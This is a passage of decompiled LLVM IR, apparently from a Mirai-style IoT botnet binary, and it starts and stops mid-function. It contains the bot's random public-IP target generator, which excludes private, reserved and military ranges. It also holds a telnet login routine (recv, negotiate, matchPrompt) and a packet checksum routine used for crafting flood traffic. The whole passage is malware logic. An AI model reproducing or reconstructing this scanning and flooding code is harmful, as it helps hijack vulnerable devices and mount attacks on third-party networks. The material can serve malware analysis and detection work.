  %v5_8049a46 = add i32 %v4_8049a20, %stack_var_-32.044
  %v2_8049a4c = load i8, i8* %v5_8049a00, align 1
  %v11_8049a4f = icmp eq i8 %v2_8049a4c, -1
  %v1_8049a51 = icmp eq i1 %v11_8049a4f, false
  br i1 %v1_8049a51, label %dec_label_pc_8049ac4, label %dec_label_pc_8049a53

dec_label_pc_8049a53:                             ; preds = %dec_label_pc_8049a43
  %v1_8049a56 = add i32 %v6_80499fd, 1
  %v4_8049a71 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049a56, i32 2, i32 0)
  %v13_8049a79 = icmp eq i32 %v4_8049a71, -1
  br i1 %v13_8049a79, label %dec_label_pc_8049b3b, label %dec_label_pc_8049a7f

dec_label_pc_8049a7f:                             ; preds = %dec_label_pc_8049a53
  %v4_8049a7f = icmp eq i32 %v4_8049a71, 0
  %v1_8049a83 = icmp eq i1 %v4_8049a7f, false
  br i1 %v1_8049a83, label %dec_label_pc_8049a94, label %dec_label_pc_8049b3b

dec_label_pc_8049a94:                             ; preds = %dec_label_pc_8049a7f
  %v5_8049a97 = add i32 %v4_8049a71, %v5_8049a46
  %v3_8049aaf = call i32 @negotiate(i32 %arg1, i32 %v6_80499fd, i32 3)
  %v1_8049ab4 = icmp eq i32 %v3_8049aaf, 0
  %v1_8049ab6 = icmp eq i1 %v1_8049ab4, false
  br i1 %v1_8049ab6, label %dec_label_pc_8049af8.backedge, label %dec_label_pc_8049b3b

dec_label_pc_8049af8.backedge:                    ; preds = %dec_label_pc_8049a94, %dec_label_pc_8049ada, %dec_label_pc_8049ae0
  %stack_var_-32.0.be = phi i32 [ %v5_8049a46, %dec_label_pc_8049ada ], [ %v5_8049a46, %dec_label_pc_8049ae0 ], [ %v5_8049a97, %dec_label_pc_8049a94 ]
  %v1_8049afb = add i32 %stack_var_-32.0.be, 2
  %v5_8049b01 = icmp slt i32 %v1_8049afb, %arg7
  br i1 %v5_8049b01, label %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge, label %dec_label_pc_8049b1f

dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge: ; preds = %dec_label_pc_8049af8.backedge
  %v3_8049b03.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b03

dec_label_pc_8049ac4:                             ; preds = %dec_label_pc_8049a43
  %v3_8049ad1 = call i32 @strstr(i32 %v5_80499fd, i8* %v2_8049ad1)
  %v1_8049ad6 = icmp eq i32 %v3_8049ad1, 0
  %v1_8049ad8 = icmp eq i1 %v1_8049ad6, false
  br i1 %v1_8049ad8, label %dec_label_pc_8049b1f, label %dec_label_pc_8049ada

dec_label_pc_8049ada:                             ; preds = %dec_label_pc_8049ac4
  br i1 %v4_8049ada, label %dec_label_pc_8049af8.backedge, label %dec_label_pc_8049ae0

dec_label_pc_8049ae0:                             ; preds = %dec_label_pc_8049ada
  %v2_8049ae6 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049aeb = icmp eq i32 %v2_8049ae6, 0
  br i1 %v1_8049aeb, label %dec_label_pc_8049af8.backedge, label %dec_label_pc_8049b1f

dec_label_pc_8049b03:                             ; preds = %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge, %dec_label_pc_8049b03.lr.ph
  %v3_8049b03 = phi i32 [ %arg4, %dec_label_pc_8049b03.lr.ph ], [ %v3_8049b03.pre, %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049b03.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049af8.backedge.dec_label_pc_8049b03_crit_edge ]
  %tmp29 = icmp slt i32 %v3_8049b03, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8049993, label %dec_label_pc_8049b11

dec_label_pc_8049b11:                             ; preds = %dec_label_pc_8049b03
  br i1 %tmp32, label %dec_label_pc_8049993, label %dec_label_pc_8049b1f

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049993, %dec_label_pc_8049b11, %dec_label_pc_8049af8.backedge, %dec_label_pc_8049ae0, %dec_label_pc_8049ac4, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049ac4 ], [ 1, %dec_label_pc_8049ae0 ], [ 0, %dec_label_pc_8049af8.backedge ], [ 0, %dec_label_pc_8049b11 ], [ 0, %dec_label_pc_8049993 ]
  br label %dec_label_pc_8049b3b

dec_label_pc_8049b3b:                             ; preds = %dec_label_pc_8049a94, %dec_label_pc_8049a53, %dec_label_pc_8049a7f, %dec_label_pc_80499fa, %dec_label_pc_8049a2e, %dec_label_pc_8049b1f
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b1f ], [ 0, %dec_label_pc_8049a2e ], [ 0, %dec_label_pc_80499fa ], [ 0, %dec_label_pc_8049a7f ], [ 0, %dec_label_pc_8049a53 ], [ 0, %dec_label_pc_8049a94 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049a71, { 1, 2, 0 }
  uselistorder i32 %v4_8049a20, { 1, 2, 0 }
  uselistorder i32 %v5_80499fd, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b3b, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b1f, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049af8.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049b4d = load i32, i32* @edi, align 4
  %v0_8049b4f = load i32, i32* @ebx, align 4
  store i32 %v0_8049b4f, i32* %stack_var_-16, align 4
  %v1_8049b53 = call i32 @random()
  %v2_8049b75 = sdiv i32 %v1_8049b53, 49
  store i32 %v2_8049b75, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049b75, -223
  %v2_8049b90 = add i32 %v1_8049b53, %tmp
  %v14_8049b90 = trunc i32 %v2_8049b90 to i8
  store i32 %v2_8049b90, i32* @eax, align 4
  store i8 %v14_8049b90, i8* @global_var_805a09b.36, align 1
  %v1_8049b9e = call i32 @random()
  %v2_8049bc0 = sdiv i32 %v1_8049b9e, 51
  store i32 %v2_8049bc0, i32* @ebx, align 4
  %tmp39 = mul i32 %v2_8049bc0, -255
  %v2_8049bd0 = add i32 %v1_8049b9e, %tmp39
  %v14_8049bd0 = trunc i32 %v2_8049bd0 to i8
  store i32 %v2_8049bd0, i32* @eax, align 4
  store i8 %v14_8049bd0, i8* @global_var_805a09c.37, align 4
  %v1_8049bde = call i32 @random()
  %v2_8049c00 = sdiv i32 %v1_8049bde, 51
  store i32 %v2_8049c00, i32* @ebx, align 4
  %tmp40 = mul i32 %v2_8049c00, -255
  %v2_8049c10 = add i32 %v1_8049bde, %tmp40
  %v14_8049c10 = trunc i32 %v2_8049c10 to i8
  store i32 %v2_8049c10, i32* @eax, align 4
  store i8 %v14_8049c10, i8* @global_var_805a09d.38, align 1
  %v1_8049c1e = call i32 @random()
  %v2_8049c40 = sdiv i32 %v1_8049c1e, 51
  store i32 %v2_8049c40, i32* @ebx, align 4
  %tmp41 = mul i32 %v2_8049c40, -255
  %v2_8049c50 = add i32 %v1_8049c1e, %tmp41
  br label %dec_label_pc_8049d6e

dec_label_pc_8049c63:                             ; preds = %dec_label_pc_8049f3d, %dec_label_pc_8049f2e, %dec_label_pc_8049f1f, %dec_label_pc_8049f10, %dec_label_pc_8049f01, %dec_label_pc_8049ef2, %dec_label_pc_8049ee3, %dec_label_pc_8049ed4, %dec_label_pc_8049ec5, %dec_label_pc_8049eb6, %dec_label_pc_8049ea7, %dec_label_pc_8049e98, %dec_label_pc_8049e89, %dec_label_pc_8049e7a, %dec_label_pc_8049e6b, %dec_label_pc_8049e46, %dec_label_pc_8049e2c, %dec_label_pc_8049e07, %dec_label_pc_8049de2, %dec_label_pc_8049dc8, %dec_label_pc_8049db9, %dec_label_pc_8049daa, %dec_label_pc_8049d9b, %dec_label_pc_8049d8c, %dec_label_pc_8049d7d, %dec_label_pc_8049d6e
  %v0_8049c63 = call i32 @random()
  %v2_8049c85 = sdiv i32 %v0_8049c63, 49
  store i32 %v2_8049c85, i32* @ebx, align 4
  %tmp42 = mul i32 %v2_8049c85, -223
  %v2_8049ca0 = add i32 %v0_8049c63, %tmp42
  %v14_8049ca0 = trunc i32 %v2_8049ca0 to i8
  store i32 %v2_8049ca0, i32* @eax, align 4
  store i8 %v14_8049ca0, i8* @global_var_805a09b.36, align 1
  %v1_8049cae = call i32 @random()
  %v2_8049cd0 = sdiv i32 %v1_8049cae, 51
  store i32 %v2_8049cd0, i32* @ebx, align 4
  %tmp43 = mul i32 %v2_8049cd0, -255
  %v2_8049ce0 = add i32 %v1_8049cae, %tmp43
  %v14_8049ce0 = trunc i32 %v2_8049ce0 to i8
  store i32 %v2_8049ce0, i32* @eax, align 4
  store i8 %v14_8049ce0, i8* @global_var_805a09c.37, align 4
  %v1_8049cee = call i32 @random()
  %v2_8049d10 = sdiv i32 %v1_8049cee, 51
  store i32 %v2_8049d10, i32* @ebx, align 4
  %tmp44 = mul i32 %v2_8049d10, -255
  %v2_8049d20 = add i32 %v1_8049cee, %tmp44
  %v14_8049d20 = trunc i32 %v2_8049d20 to i8
  store i32 %v2_8049d20, i32* @eax, align 4
  store i8 %v14_8049d20, i8* @global_var_805a09d.38, align 1
  %v1_8049d2e = call i32 @random()
  %v2_8049d50 = sdiv i32 %v1_8049d2e, 51
  store i32 %v2_8049d50, i32* @ebx, align 4
  %tmp45 = mul i32 %v2_8049d50, -255
  %v2_8049d60 = add i32 %v1_8049d2e, %tmp45
  br label %dec_label_pc_8049d6e

dec_label_pc_8049d6e:                             ; preds = %entry, %dec_label_pc_8049c63
  %storemerge13.in = phi i32 [ %v2_8049d60, %dec_label_pc_8049c63 ], [ %v2_8049c50, %entry ]
  %v14_8049c50 = trunc i32 %storemerge13.in to i8
  store i8 %v14_8049c50, i8* @global_var_805a09e.39, align 2
  %v0_8049d6e = load i8, i8* @global_var_805a09b.36, align 1
  %v1_8049d6e = zext i8 %v0_8049d6e to i32
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049d75 = icmp eq i8 %v0_8049d6e, 127
  br i1 %v10_8049d75, label %dec_label_pc_8049c63, label %dec_label_pc_8049d7d

dec_label_pc_8049d7d:                             ; preds = %dec_label_pc_8049d6e
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v4_8049d84 = icmp eq i8 %v0_8049d6e, 0
  br i1 %v4_8049d84, label %dec_label_pc_8049c63, label %dec_label_pc_8049d8c

dec_label_pc_8049d8c:                             ; preds = %dec_label_pc_8049d7d
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049d93 = icmp eq i8 %v0_8049d6e, 3
  br i1 %v10_8049d93, label %dec_label_pc_8049c63, label %dec_label_pc_8049d9b

dec_label_pc_8049d9b:                             ; preds = %dec_label_pc_8049d8c
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049da2 = icmp eq i8 %v0_8049d6e, 15
  br i1 %v10_8049da2, label %dec_label_pc_8049c63, label %dec_label_pc_8049daa

dec_label_pc_8049daa:                             ; preds = %dec_label_pc_8049d9b
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v7_8049db1 = icmp eq i8 %v0_8049d6e, 16
  br i1 %v7_8049db1, label %dec_label_pc_8049c63, label %dec_label_pc_8049db9

dec_label_pc_8049db9:                             ; preds = %dec_label_pc_8049daa
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049dc0 = icmp eq i8 %v0_8049d6e, 56
  br i1 %v10_8049dc0, label %dec_label_pc_8049c63, label %dec_label_pc_8049dc8

dec_label_pc_8049dc8:                             ; preds = %dec_label_pc_8049db9
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049dcf = icmp eq i8 %v0_8049d6e, 10
  br i1 %v10_8049dcf, label %dec_label_pc_8049c63, label %dec_label_pc_8049dd7

dec_label_pc_8049dd7:                             ; preds = %dec_label_pc_8049dc8
  %v8_8049dde = icmp eq i8 %v0_8049d6e, -64
  %v1_8049de0 = icmp eq i1 %v8_8049dde, false
  br i1 %v1_8049de0, label %dec_label_pc_8049df1, label %dec_label_pc_8049de2

dec_label_pc_8049de2:                             ; preds = %dec_label_pc_8049dd7
  %v0_8049de2 = load i8, i8* @global_var_805a09c.37, align 4
  %v1_8049de2 = zext i8 %v0_8049de2 to i32
  store i32 %v1_8049de2, i32* @eax, align 4
  %v11_8049de9 = icmp eq i8 %v0_8049de2, -88
  br i1 %v11_8049de9, label %dec_label_pc_8049c63, label %dec_label_pc_8049df1

dec_label_pc_8049df1:                             ; preds = %dec_label_pc_8049de2, %dec_label_pc_8049dd7
  %v11_8049df8 = icmp eq i8 %v0_8049d6e, -84
  %v1_8049dfa = icmp eq i1 %v11_8049df8, false
  br i1 %v1_8049dfa, label %dec_label_pc_8049e16, label %dec_label_pc_8049dfc

dec_label_pc_8049dfc:                             ; preds = %dec_label_pc_8049df1
  %v0_8049dfc = load i8, i8* @global_var_805a09c.37, align 4
  %tmp46 = icmp ult i8 %v0_8049dfc, 16
  br i1 %tmp46, label %dec_label_pc_8049e16, label %dec_label_pc_8049e07

dec_label_pc_8049e07:                             ; preds = %dec_label_pc_8049dfc
  %v1_8049dfc = zext i8 %v0_8049dfc to i32
  store i32 %v1_8049dfc, i32* @eax, align 4
  %tmp47 = icmp ult i8 %v0_8049dfc, 32
  br i1 %tmp47, label %dec_label_pc_8049c63, label %dec_label_pc_8049e16

dec_label_pc_8049e16:                             ; preds = %dec_label_pc_8049e07, %dec_label_pc_8049dfc, %dec_label_pc_8049df1
  %v10_8049e1d = icmp eq i8 %v0_8049d6e, 100
  %v1_8049e1f = icmp eq i1 %v10_8049e1d, false
  br i1 %v1_8049e1f, label %dec_label_pc_8049e3b, label %dec_label_pc_8049e21

dec_label_pc_8049e21:                             ; preds = %dec_label_pc_8049e16
  %v0_8049e21 = load i8, i8* @global_var_805a09c.37, align 4
  %tmp48 = icmp ult i8 %v0_8049e21, 64
  br i1 %tmp48, label %dec_label_pc_8049e3b, label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %dec_label_pc_8049e21
  %v1_8049e21 = zext i8 %v0_8049e21 to i32
  store i32 %v1_8049e21, i32* @eax, align 4
  %tmp49 = icmp ult i8 %v0_8049e21, 127
  br i1 %tmp49, label %dec_label_pc_8049c63, label %dec_label_pc_8049e3b

dec_label_pc_8049e3b:                             ; preds = %dec_label_pc_8049e2c, %dec_label_pc_8049e21, %dec_label_pc_8049e16
  %v11_8049e42 = icmp eq i8 %v0_8049d6e, -87
  %v1_8049e44 = icmp eq i1 %v11_8049e42, false
  br i1 %v1_8049e44, label %dec_label_pc_8049e55, label %dec_label_pc_8049e46

dec_label_pc_8049e46:                             ; preds = %dec_label_pc_8049e3b
  %v0_8049e46 = load i8, i8* @global_var_805a09c.37, align 4
  %v1_8049e46 = zext i8 %v0_8049e46 to i32
  store i32 %v1_8049e46, i32* @eax, align 4
  %v11_8049e4d = icmp eq i8 %v0_8049e46, -1
  br i1 %v11_8049e4d, label %dec_label_pc_8049c63, label %dec_label_pc_8049e55

dec_label_pc_8049e55:                             ; preds = %dec_label_pc_8049e46, %dec_label_pc_8049e3b
  %v11_8049e5c = icmp eq i8 %v0_8049d6e, -58
  %v1_8049e5e = icmp eq i1 %v11_8049e5c, false
  br i1 %v1_8049e5e, label %dec_label_pc_8049e7a, label %dec_label_pc_8049e60

dec_label_pc_8049e60:                             ; preds = %dec_label_pc_8049e55
  %v0_8049e60 = load i8, i8* @global_var_805a09c.37, align 4
  %tmp50 = icmp ult i8 %v0_8049e60, 18
  br i1 %tmp50, label %dec_label_pc_8049e7a, label %dec_label_pc_8049e6b

dec_label_pc_8049e6b:                             ; preds = %dec_label_pc_8049e60
  %v1_8049e60 = zext i8 %v0_8049e60 to i32
  store i32 %v1_8049e60, i32* @eax, align 4
  %tmp51 = or i8 %v0_8049e60, 1
  %tmp52 = icmp eq i8 %tmp51, 19
  br i1 %tmp52, label %dec_label_pc_8049c63, label %dec_label_pc_8049e7a

dec_label_pc_8049e7a:                             ; preds = %dec_label_pc_8049e6b, %dec_label_pc_8049e60, %dec_label_pc_8049e55
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v8_8049e81 = icmp eq i8 %v0_8049d6e, -32
  br i1 %v8_8049e81, label %dec_label_pc_8049c63, label %dec_label_pc_8049e89

dec_label_pc_8049e89:                             ; preds = %dec_label_pc_8049e7a
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049e90 = icmp eq i8 %v0_8049d6e, 6
  br i1 %v10_8049e90, label %dec_label_pc_8049c63, label %dec_label_pc_8049e98

dec_label_pc_8049e98:                             ; preds = %dec_label_pc_8049e89
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049e9f = icmp eq i8 %v0_8049d6e, 7
  br i1 %v10_8049e9f, label %dec_label_pc_8049c63, label %dec_label_pc_8049ea7

dec_label_pc_8049ea7:                             ; preds = %dec_label_pc_8049e98
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049eae = icmp eq i8 %v0_8049d6e, 11
  br i1 %v10_8049eae, label %dec_label_pc_8049c63, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049ea7
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049ebd = icmp eq i8 %v0_8049d6e, 21
  br i1 %v10_8049ebd, label %dec_label_pc_8049c63, label %dec_label_pc_8049ec5

dec_label_pc_8049ec5:                             ; preds = %dec_label_pc_8049eb6
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049ecc = icmp eq i8 %v0_8049d6e, 22
  br i1 %v10_8049ecc, label %dec_label_pc_8049c63, label %dec_label_pc_8049ed4

dec_label_pc_8049ed4:                             ; preds = %dec_label_pc_8049ec5
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049edb = icmp eq i8 %v0_8049d6e, 26
  br i1 %v10_8049edb, label %dec_label_pc_8049c63, label %dec_label_pc_8049ee3

dec_label_pc_8049ee3:                             ; preds = %dec_label_pc_8049ed4
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049eea = icmp eq i8 %v0_8049d6e, 28
  br i1 %v10_8049eea, label %dec_label_pc_8049c63, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049ee3
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049ef9 = icmp eq i8 %v0_8049d6e, 29
  br i1 %v10_8049ef9, label %dec_label_pc_8049c63, label %dec_label_pc_8049f01

dec_label_pc_8049f01:                             ; preds = %dec_label_pc_8049ef2
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049f08 = icmp eq i8 %v0_8049d6e, 30
  br i1 %v10_8049f08, label %dec_label_pc_8049c63, label %dec_label_pc_8049f10

dec_label_pc_8049f10:                             ; preds = %dec_label_pc_8049f01
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049f17 = icmp eq i8 %v0_8049d6e, 33
  br i1 %v10_8049f17, label %dec_label_pc_8049c63, label %dec_label_pc_8049f1f

dec_label_pc_8049f1f:                             ; preds = %dec_label_pc_8049f10
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v10_8049f26 = icmp eq i8 %v0_8049d6e, 55
  br i1 %v10_8049f26, label %dec_label_pc_8049c63, label %dec_label_pc_8049f2e

dec_label_pc_8049f2e:                             ; preds = %dec_label_pc_8049f1f
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v11_8049f35 = icmp eq i8 %v0_8049d6e, -42
  br i1 %v11_8049f35, label %dec_label_pc_8049c63, label %dec_label_pc_8049f3d

dec_label_pc_8049f3d:                             ; preds = %dec_label_pc_8049f2e
  store i32 %v1_8049d6e, i32* @eax, align 4
  %v11_8049f44 = icmp eq i8 %v0_8049d6e, -41
  br i1 %v11_8049f44, label %dec_label_pc_8049c63, label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f3d
  store i32 0, i32* %stack_var_-32, align 4
  %v1_8049f68 = urem i32 %storemerge13.in, 256
  store i32 %v1_8049f68, i32* @edx, align 4
  %v0_8049f7c = load i8, i8* @global_var_805a09c.37, align 4
  %v1_8049f7c = zext i8 %v0_8049f7c to i32
  store i32 %v1_8049f7c, i32* @ebx, align 4
  %v2_8049f95 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049f95, i32* @edi, align 4
  %v4_8049faf = call i32 @szprintf(i32 %v2_8049f95, i32 ptrtoint ([12 x i8]* @global_var_805672c.40 to i32), i32 %v1_8049d6e)
  %v1_8049fba = call i32 @inet_addr(i32 %v2_8049f95)
  %v2_8049fc2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049fc2, i32* @ebx, align 4
  store i32 %v0_8049b4d, i32* @edi, align 4
  ret i32 %v1_8049fba

; uselistorder directives
  uselistorder i8 %v0_8049e60, { 0, 2, 1 }
  uselistorder i8 %v0_8049e21, { 0, 2, 1 }
  uselistorder i8 %v0_8049dfc, { 0, 2, 1 }
  uselistorder i8 %v0_8049d6e, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32 %v2_8049d20, { 1, 0 }
  uselistorder i32 %v2_8049ce0, { 1, 0 }
  uselistorder i32 %v2_8049ca0, { 1, 0 }
  uselistorder i32 %v2_8049c10, { 1, 0 }
  uselistorder i32 %v2_8049bd0, { 1, 0 }
  uselistorder i32 %v2_8049b90, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8* @global_var_805a09d.38, { 1, 0 }
  uselistorder i8* @global_var_805a09c.37, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805a09b.36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049d6e, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049fc7 = load i32, i32* @ebp, align 4
  store i32 %v0_8049fc7, i32* %stack_var_-4, align 4
  %v0_8049fcd = load i32, i32* @global_var_8060308.41, align 8
  %v1_8049fd5 = call i32 @ntohl(i32 %v0_8049fcd)
  %v5_8049fda = and i32 %v1_8049fd5, %arg1
  %v1_8049fe0 = call i32 @rand_cmwc(i32 %v5_8049fda)
  %v1_8049fea = sub i32 -1, %arg1
  %v2_8049fec = and i32 %v1_8049fe0, %v1_8049fea
  %v5_8049fee = xor i32 %v2_8049fec, %v5_8049fda
  %v2_8049ff1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ff1, i32* @ebp, align 4
  ret i32 %v5_8049fee
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049ff8 = load i32, i32* @ebx, align 4
  %v4_804a02733 = add i32 %arg2, -1
  %v9_804a02734 = sub i32 0, %arg2
  %v10_804a02735 = and i32 %arg2, %v9_804a02734
  %v11_804a02736 = icmp slt i32 %v10_804a02735, 0
  %v12_804a02737 = icmp eq i32 %v4_804a02733, 0
  %v13_804a02738 = icmp slt i32 %v4_804a02733, 0
  %v3_804a02b39 = icmp eq i1 %v13_804a02738, %v11_804a02736
  %v4_804a02b40 = icmp eq i1 %v12_804a02737, false
  %v5_804a02b41 = and i1 %v4_804a02b40, %v3_804a02b39
  br i1 %v5_804a02b41, label %dec_label_pc_804a00c, label %dec_label_pc_804a02d

dec_label_pc_804a00c:                             ; preds = %entry, %dec_label_pc_804a00c
  %stack_var_-24.045 = phi i16 [ %v9_804a01c, %dec_label_pc_804a00c ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804a023, %dec_label_pc_804a00c ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804a01f, %dec_label_pc_804a00c ], [ %arg1, %entry ]
  %v3_804a01942 = phi i32 [ %v6_804a019, %dec_label_pc_804a00c ], [ 0, %entry ]
  %v4_804a00c = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804a00f = load i16, i16* %stack_var_4.043, align 2
  %v3_804a00f = zext i16 %v2_804a00f to i32
  %sext51 = mul i32 %v3_804a01942, 65536
  %v4_804a019 = sdiv i32 %sext51, 65536
  %v6_804a019 = add nsw i32 %v3_804a00f, %v4_804a019
  %v11_804a019 = icmp ult i32 %v6_804a019, %v4_804a019
  %v26_804a019 = trunc i32 %v6_804a019 to i16
  %v7_804a01c = zext i1 %v11_804a019 to i16
  %v9_804a01c = add i16 %v7_804a01c, %stack_var_-24.045
  %v5_804a01f = add i32 %v4_804a00c, 2
  %v23_804a01f = inttoptr i32 %v5_804a01f to i16*
  %v4_804a023 = add i32 %stack_var_8.044, -2
  %v4_804a027 = add i32 %stack_var_8.044, -3
  %v9_804a027 = sub i32 2, %stack_var_8.044
  %v10_804a027 = and i32 %v4_804a023, %v9_804a027
  %v11_804a027 = icmp slt i32 %v10_804a027, 0
  %v12_804a027 = icmp eq i32 %v4_804a027, 0
  %v13_804a027 = icmp slt i32 %v4_804a027, 0
  %v3_804a02b = icmp eq i1 %v13_804a027, %v11_804a027
  %v4_804a02b = icmp eq i1 %v12_804a027, false
  %v5_804a02b = and i1 %v4_804a02b, %v3_804a02b
  br i1 %v5_804a02b, label %dec_label_pc_804a00c, label %dec_label_pc_804a02d

dec_label_pc_804a02d:                             ; preds = %dec_label_pc_804a00c, %entry
  %v3_804a019.lcssa = phi i16 [ 0, %entry ], [ %v26_804a019, %dec_label_pc_804a00c ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804a01f, %dec_label_pc_804a00c ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804a023, %dec_label_pc_804a00c ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804a01c, %dec_label_pc_804a00c ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804a06e.preheader, label %dec_label_pc_804a033

dec_label_pc_804a033:                             ; preds = %dec_label_pc_804a02d
  %v1_804a036 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804a036 = load i8, i8* %v1_804a036, align 1
  %v3_804a036 = zext i8 %v2_804a036 to i32
  %v4_804a041 = sext i16 %v3_804a019.lcssa to i32
  %v6_804a041 = add nsw i32 %v3_804a036, %v4_804a041
  %v11_804a041 = icmp ult i32 %v6_804a041, %v4_804a041
  %v26_804a041 = trunc i32 %v6_804a041 to i16
  %v7_804a044 = zext i1 %v11_804a041 to i16
  %v9_804a044 = add i16 %v7_804a044, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804a06e.preheader

dec_label_pc_804a06e.preheader:                   ; preds = %dec_label_pc_804a033, %dec_label_pc_804a02d
  %v3_804a053.ph = phi i16 [ %v3_804a019.lcssa, %dec_label_pc_804a02d ], [ %v26_804a041, %dec_label_pc_804a033 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804a02d ], [ %v9_804a044, %dec_label_pc_804a033 ]
  %v4_804a06e20 = sext i16 %v3_804a053.ph to i32
  %v4_804a07121 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804a07422 = udiv i32 %v4_804a06e20, 65536
  %v4_804a07423 = mul i32 %v4_804a07121, 65536
  %v5_804a07424 = or i32 %v4_804a07423, %v3_804a07422
  %v2_804a07825 = udiv i32 %v4_804a07121, 65536
  %v2_804a07b26 = or i32 %v5_804a07424, %v2_804a07825
  %v3_804a07b27 = icmp eq i32 %v2_804a07b26, 0
  %v1_804a07f28 = icmp eq i1 %v3_804a07b27, false
  br i1 %v1_804a07f28, label %dec_label_pc_804a049, label %dec_label_pc_804a081

dec_label_pc_804a049:                             ; preds = %dec_label_pc_804a06e.preheader, %dec_label_pc_804a049
  %v2_804a07831 = phi i32 [ %v2_804a078, %dec_label_pc_804a049 ], [ %v2_804a07825, %dec_label_pc_804a06e.preheader ]
  %v5_804a07430 = phi i32 [ %v5_804a074, %dec_label_pc_804a049 ], [ %v5_804a07424, %dec_label_pc_804a06e.preheader ]
  %v4_804a06e29 = phi i32 [ %v4_804a06e, %dec_label_pc_804a049 ], [ %v4_804a06e20, %dec_label_pc_804a06e.preheader ]
  %v2_804a064 = add i32 %v5_804a07430, %v4_804a06e29
  %v7_804a064 = icmp ult i32 %v2_804a064, %v4_804a06e29
  %v3_804a066 = zext i1 %v7_804a064 to i32
  %v5_804a066 = add nuw nsw i32 %v3_804a066, %v2_804a07831
  %sext = mul i32 %v2_804a064, 65536
  %v4_804a06e = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804a066, 65536
  %v4_804a071 = sdiv i32 %sext50, 65536
  %v3_804a074 = udiv i32 %v4_804a06e, 65536
  %v5_804a074 = or i32 %sext50, %v3_804a074
  %v2_804a078 = udiv i32 %v4_804a071, 65536
  %v2_804a07b = or i32 %v5_804a074, %v2_804a078
  %v3_804a07b = icmp eq i32 %v2_804a07b, 0
  %v1_804a07f = icmp eq i1 %v3_804a07b, false
